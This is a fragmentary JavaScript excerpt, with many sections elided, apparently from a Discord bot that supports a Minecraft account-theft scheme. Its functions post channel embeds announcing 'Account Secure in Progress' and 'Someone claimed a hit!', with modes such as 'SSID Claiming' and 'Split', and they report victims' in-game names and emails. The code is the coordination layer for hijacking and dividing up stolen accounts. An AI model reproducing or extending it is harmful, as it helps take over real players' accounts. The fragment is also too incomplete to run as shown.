...
async function secEmailMessager(client, guildId, channelId, interaction, id, mcname, email, secs, var1, d = false) {
    try {
        ...
        if (!d) {
            ...
            await interaction.editReply({
                embeds: [await getEmbed(client, "sec", var1)],
            ...
            embeds: [
                {
                    ...
                    thumbnail: thumbnailUrl ? { url: thumbnailUrl } : undefined,
                    footer: {
                        text: d ? null : (uid ? "Account Secure in Progress" : null)
                    }
                }
            ],
            attachments: []
...
async function invalidEmailRegexMessager(client, guildId, channelId, interaction, mcname, email, d = false) {
    try {
        if (!d) {
            await interaction.editReply({
                embeds: [await getEmbed(client, `invalid email`)],
                ephemeral: true
            });
        }
      ...
      //  console.log(`split: ${split}`);
        ...
        await client.guilds.cache.get(guildId).channels.cache.get(channelId).send({
            embeds: [{
                ...
                description: `**Mode** \`Split [${restConverted} -> ${claimingConverted}]\`\n` +
                             `**IGN** \`${name}\`\n` +
    ...
    if (mode == 1) {
        try {
            await client.guilds.cache.get(guildId).channels.cache.get(chanelId).send({
                embeds: [{
                    title: `Someone claimed a hit!`,
                    description: `**Mode** \`Full Claiming\``,
                    color: 0xADD8E6
                }]
            });
        } catch (e) {
        ...
        try {
            await client.guilds.cache.get(guildId).channels.cache.get(chanelId).send({
                embeds: [{
                    title: `Someone claimed a hit!`,
                    description: `**Mode** \`SSID Claiming\`\n**IGN** \`${name}\``,
                    color: 0xADD8E6
                }]
            });
        } catch (e) {
        ...
        try {
            await client.guilds.cache.get(guildId).channels.cache.get(chanelId).send({
                embeds: [{
                    title: `Someone claimed a hit!`,
                    description: `**Mode** \`Nothing Claiming\`\n**IGN** \`${name}\``,
                    color: 0xADD8E6
                }]
            });
        } catch (e) {
